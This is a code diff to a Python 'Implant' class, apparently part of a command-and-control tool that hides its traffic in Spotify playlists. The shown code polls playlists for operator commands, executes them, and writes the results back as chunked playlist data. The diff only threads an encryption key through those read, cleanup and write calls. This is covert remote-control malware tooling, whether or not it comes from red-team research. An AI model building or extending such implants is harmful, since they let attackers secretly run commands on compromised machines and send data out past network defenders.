@@ -70,7 +70,8 @@ class Implant:
         """Check for new commands, execute, return results."""
         try:
             seq_groups = self.spotify.read_c2_playlists(
-                channel=proto.CHANNEL_CMD
+                channel=proto.CHANNEL_CMD,
+                encryption_key=self.key,
             )
         except Exception as err:
             print(f"[!] Poll error: {err}")
@@ -82,7 +83,7 @@ class Implant:
         for seq_num in sorted(seq_groups.keys()):
             if seq_num in self.processed_seqs:
                 self.spotify.clean_c2_playlists(
-                    proto.CHANNEL_CMD, seq=seq_num
+                    proto.CHANNEL_CMD, self.key, seq=seq_num
                 )
                 continue
 
@@ -94,7 +95,7 @@ class Implant:
             except Exception as err:
                 print(f"[!] Failed to decode seq={seq_num}: {err}")
                 self.spotify.clean_c2_playlists(
-                    proto.CHANNEL_CMD, seq=seq_num
+                    proto.CHANNEL_CMD, self.key, seq=seq_num
                 )
                 continue
 
@@ -104,7 +105,7 @@ class Implant:
             result = self._execute(msg)
             self._send_result(result)
             self.spotify.clean_c2_playlists(
-                proto.CHANNEL_CMD, seq=seq_num
+                proto.CHANNEL_CMD, self.key, seq=seq_num
             )
             self.processed_seqs.add(seq_num)
 
@@ -251,7 +252,7 @@ class Implant:
                 result.to_result_dict(), self.key
             )
             chunks = proto.chunk_payload(
-                encoded, result.seq, proto.CHANNEL_RES
+                encoded, result.seq, proto.CHANNEL_RES, self.key
             )
             self.spotify.write_c2_playlists(chunks)
             print(f"[*] Result sent for seq={result.seq}")
